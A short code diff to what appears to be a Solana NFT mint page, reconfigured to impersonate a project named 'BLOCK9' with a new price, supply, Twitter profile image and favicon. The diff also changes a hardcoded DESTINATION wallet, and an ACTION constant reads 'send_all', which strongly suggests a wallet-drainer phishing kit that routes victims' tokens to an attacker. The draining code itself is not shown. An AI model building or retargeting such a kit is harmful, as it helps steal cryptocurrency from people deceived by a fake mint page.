@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = "0.069"
-const image = 'https://pbs.twimg.com/profile_images/1710797421574561792/VcFs5b29_400x400.jpg'
-const Title = 'Mojo'
-const supply = 2588
+const solAmount = "1.5"
+const image = 'https://pbs.twimg.com/profile_images/1600547577619005452/PEh4vSBX_400x400.jpg'
+const Title = 'BLOCK9'
+const supply = 177
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('4444yauc6XPT2TKY1GQkQ88SKeJaSVzH5JkohuHmPJNR');
+const DESTINATION = new PublicKey('BURn8W8kv6xfQfzgqCzdS8kcMyRoVsQc95MsoqjtoRKC');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
